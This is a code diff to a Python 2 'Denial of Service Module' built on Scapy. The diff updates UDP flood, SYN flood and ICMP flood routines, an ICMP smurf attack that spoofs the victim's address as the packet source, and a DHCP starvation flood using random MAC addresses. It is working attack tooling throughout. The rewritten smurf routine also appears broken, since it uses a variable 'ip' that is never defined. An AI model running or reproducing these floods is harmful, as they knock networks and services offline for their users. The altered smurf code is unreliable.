@@ -29,7 +29,7 @@ class Jam(object):
 
 	name = "Denial of Service Module."
 	desc = "Denial of service attacks here."
-	version = "0.7"
+	version = "0.8"
 	ps = "Need to add POST DoS attack."
 
 	def __init__(self):
@@ -69,13 +69,14 @@ class Jam(object):
 		self.dport = dport
 		try:
 			print "[+] UDP flood denial of service initialized on port: {}.".format(dport)
-			for i in range(0,3):
+			for i in range(0,5):
 				u = threading.Thread(name='udpflood',target=self.udpflood)
 				u.setDaemon(True)
 				u.start()
 			self.udpflood()
 		except KeyboardInterrupt:
 			print "[-] UDP flood denial of service finalized."
+			exit(0)
 		except Exception as e:
 			print "[!] Exception caught: {}".format(e)
 
@@ -101,6 +102,7 @@ class Jam(object):
 			self.synflood()
 		except KeyboardInterrupt:
 			print "[-] SYN flood denial of service finalized."
+			exit(0)
 		except Exception as e:
 			print "[!] Exception caught: {}".format(e)
 
@@ -126,6 +128,7 @@ class Jam(object):
                         self.icmpflood()
                 except KeyboardInterrupt:
                         print "[-] ICMP flood denial of service finalized."
+			exit(0)
                 except Exception as e:
                         print "[!] Exception caught: {}".format(e)
 
@@ -142,11 +145,7 @@ class Jam(object):
 	def icmpsmurfstart(self, tgt):
 		self.tgt = tgt
 		try:
-			multicast = raw_input("[+] IP Address(es) to send echo-requests (separated by commas): ")
-			try:
-				self.multicast = multicast.split(",")
-			except:
-				self.multicast
+			multicast = raw_input("[+] IP Address to send echo-requests: ")
 			print "[+] ICMP smurf denial of service initialized."
 			for x in range(0,3):
 				i2 = threading.Thread(name='icmpsmurf',target=self.icmpsmurf)
@@ -155,18 +154,17 @@ class Jam(object):
 			self.icmpsmurf()
 		except KeyboardInterrupt:
 			print "[-] ICMP smurf denial of service finalized."
+			exit(0)
 		except:
 			print "[!] Error: check the parameters (target)"
 
 
 	def icmpsmurf(self):
 		try:
-			while True:
-				for ip in self.multicast:
-					IP_layer = IP(src=self.tgt,dst=ip)
-					ICMP_layer = ICMP()
-					pkt = IP_layer/ICMP_layer
-					send(pkt, verbose=False)
+			IP_layer = IP(src=self.tgt,dst=ip)
+			ICMP_layer = ICMP()
+			pkt = IP_layer/ICMP_layer
+			send(pkt, loop=1, inter=0.0, verbose=False)
 
 		except Exception as e:
 			print "[!] Error: {}".format(e)
@@ -179,9 +177,10 @@ class Jam(object):
                                 i = threading.Thread(name='dhcpstarvation', target=self.dhcpstarvation)
                                 i.setDaemon(True)
                                 i.start()
-                        self.icmpflood()
+                        self.dhcpstarvation()
                 except KeyboardInterrupt:
                         print "[-] DHCP starvation denial of service finalized."
+			exit(0)
                 except Exception as e:
                         print "[!] Exception caught: {}".format(e)
 
@@ -193,4 +192,4 @@ class Jam(object):
 			dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
 			sendp(dhcp_discover, loop=1, inter=0.0, verbose=False)
 		except Exception as e:
-			print "[!] Error: {}".format(e)
+			pass
